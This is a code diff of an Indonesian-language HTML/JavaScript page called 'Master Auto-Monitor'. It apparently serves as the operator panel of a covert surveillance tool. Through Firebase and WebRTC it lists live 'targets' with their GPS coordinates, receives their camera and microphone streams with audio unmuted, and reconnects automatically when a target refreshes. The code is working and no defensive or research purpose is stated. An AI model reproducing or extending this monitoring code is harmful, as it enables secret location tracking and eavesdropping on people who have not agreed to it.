@@ -2,38 +2,34 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>C.R Master Auto-Monitor</title>
+    <title>Master Auto-Monitor</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; overflow: hidden; }
-        #list { width: 250px; border-right: 1px solid #0f0; padding: 10px; overflow-y: auto; background: #050505; }
-        #view { flex: 1; display: flex; flex-direction: column; padding: 20px; position: relative; }
-        .target { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; }
-        .target:hover { background: #020; }
-        .target.active { background: #0f0; color: #000; font-weight: bold; }
-        #vid-box { width: 100%; flex: 1; background: #111; border: 2px solid #0f0; position: relative; overflow: hidden; border-radius: 8px; }
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; }
+        #list { width: 250px; border-right: 1px solid #0f0; padding: 10px; overflow-y: auto; }
+        #view { flex: 1; display: flex; flex-direction: column; padding: 20px; }
+        .target { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; cursor: pointer; }
+        .target.active { background: #040; }
+        #vid-box { width: 100%; flex: 1; background: #111; border: 2px solid #0f0; position: relative; }
         video { width: 100%; height: 100%; object-fit: contain; }
-        #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); 
-                   display: flex; flex-direction: column; justify-content: center; align-items: center; color: #0f0; cursor: pointer; z-index: 100; }
+        #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); 
+                   display: flex; justify-content: center; align-items: center; color: white; cursor: pointer; z-index: 10; }
         .hidden { display: none !important; }
-        #meta { margin-top: 10px; font-size: 14px; background: #111; padding: 10px; border: 1px solid #333; }
     </style>
 </head>
 <body>
     <div id="list">
-        <h3 style="text-align:center; border-bottom: 1px solid #0f0; padding-bottom: 10px;">C.R MONITOR V1</h3>
+        <h3>LIST TARGET</h3>
         <div id="targets"></div>
     </div>
     <div id="view">
         <div id="vid-box">
-            <div id="overlay">
-                <h2>C.R ON</h2>
-                <p>KLIK UNTUK AKTIFKAN TRANSMISI</p>
-            </div>
+            <!-- Overlay untuk memicu suara (syarat browser) -->
+            <div id="overlay">KLIK DI SINI UNTUK AKTIFKAN MONITORING</div>
             <video id="rv" autoplay playsinline></video>
         </div>
-        <div id="meta">Status: Standby | Menunggu Target...</div>
+        <p id="meta">Pilih target...</p>
     </div>
 
     <script>
@@ -45,19 +41,17 @@
         firebase.initializeApp(config);
         const rootDb = firebase.database().ref('v5_multi');
 
-        let currentId = sessionStorage.getItem('last_target');
+        let currentId = null;
         let pc = null;
         let isActivated = false;
-        window.lastOfferTs = 0;
 
+        // Klik overlay untuk mengizinkan audio selamanya di sesi ini
         document.getElementById('overlay').onclick = function() {
             this.classList.add('hidden');
             isActivated = true;
             document.getElementById('rv').play();
-            if(currentId) selectTarget(currentId);
         };
 
-        // Monitor daftar target secara real-time
         rootDb.on('value', snapshot => {
             const cont = document.getElementById('targets');
             cont.innerHTML = "";
@@ -66,86 +60,52 @@
 
             Object.keys(data).forEach(id => {
                 const t = data[id];
-                // Cek apakah target masih aktif (last seen < 15 detik)
-                if (t.status && Date.now() - t.status.lastSeen < 15000) {
+                if (Date.now() - t.status.lastSeen < 15000) {
                     const d = document.createElement('div');
                     d.className = "target " + (id === currentId ? 'active' : '');
-                    d.innerHTML = `ID: ${id}<br><small>📍 ${t.status.lat.toFixed(4)}, ${t.status.lng.toFixed(4)}</small>`;
+                    d.innerHTML = `ID: ${id}<br><small>LIVE</small>`;
                     d.onclick = () => selectTarget(id);
                     cont.appendChild(d);
                     
-                    // AUTO-RECONNECT: Jika target refresh/kirim offer baru
-                    if (id === currentId && t.sdp && t.sdp.offer) {
-                        if (t.sdp.offer.ts > window.lastOfferTs) {
-                            window.lastOfferTs = t.sdp.offer.ts;
-                            console.log("Detecting new offer from " + id);
-                            connect(id, t.sdp.offer);
-                        }
+                    // AUTO-RECONNECT: Jika target yang sedang dilihat kirim offer baru (refresh)
+                    if (id === currentId && t.sdp && t.sdp.offer && t.sdp.offer.ts > (window.lastOfferTs || 0)) {
+                        window.lastOfferTs = t.sdp.offer.ts;
+                        connect(id, t.sdp.offer);
                     }
                 }
             });
         });
 
         async function connect(id, offer) {
-            if (pc) {
-                pc.close();
-                pc = null;
-            }
-            
+            if (pc) pc.close();
             pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
             
             pc.ontrack = e => {
-                console.log("Track received from " + id);
                 const rv = document.getElementById('rv');
                 rv.srcObject = e.streams[0];
-                if(isActivated) {
-                    rv.muted = false;
-                    rv.play().catch(err => console.log("Auto-play blocked"));
-                }
+                if(isActivated) rv.muted = false;
             };
 
             pc.onicecandidate = e => {
-                if (e.candidate) {
-                    rootDb.child(id + '/ice_m').push(e.candidate.toJSON());
-                }
+                if (e.candidate) rootDb.child(id + '/ice_m').push(e.candidate.toJSON());
             };
 
-            try {
-                await pc.setRemoteDescription(new RTCSessionDescription(offer));
-                const answer = await pc.createAnswer();
-                await pc.setLocalDescription(answer);
-                
-                // Kirim answer balik ke firebase
-                rootDb.child(id + '/sdp/answer').set({ 
-                    type: answer.type, 
-                    sdp: answer.sdp,
-                    ts: Date.now()
-                });
+            await pc.setRemoteDescription(new RTCSessionDescription(offer));
+            const answer = await pc.createAnswer();
+            await pc.setLocalDescription(answer);
+            rootDb.child(id + '/sdp/answer').set({ type: answer.type, sdp: answer.sdp });
 
-                // Listen ICE candidates dari target
-                rootDb.child(id + '/ice_t').off(); // Clear old listener
-                rootDb.child(id + '/ice_t').on('child_added', s => {
-                    if (pc) pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e => {});
-                });
-
-                document.getElementById('meta').innerText = `Target: ${id} | CONNECTED (Live Data)`;
-            } catch (err) {
-                console.error("Connection failed", err);
-            }
+            rootDb.child(id + '/ice_t').on('child_added', s => {
+                pc.addIceCandidate(new RTCIceCandidate(s.val()));
+            });
         }
 
         function selectTarget(id) {
             currentId = id;
-            sessionStorage.setItem('last_target', id);
-            window.lastOfferTs = 0; // Reset TS supaya trigger connect di loop on('value')
-            
-            // Highlight list
-            const targets = document.querySelectorAll('.target');
-            targets.forEach(t => t.classList.remove('active'));
-            
+            window.lastOfferTs = 0; // Trigger reconnection
             rootDb.child(id + '/status').once('value', s => {
                 const d = s.val();
-                if(d) document.getElementById('meta').innerText = `Menghubungkan ke: ${id}...`;
+                document.getElementById('meta').innerText = `Target: ${id} | Loc: ${d.lat}, ${d.lng}`;
             });
         }
     </script>
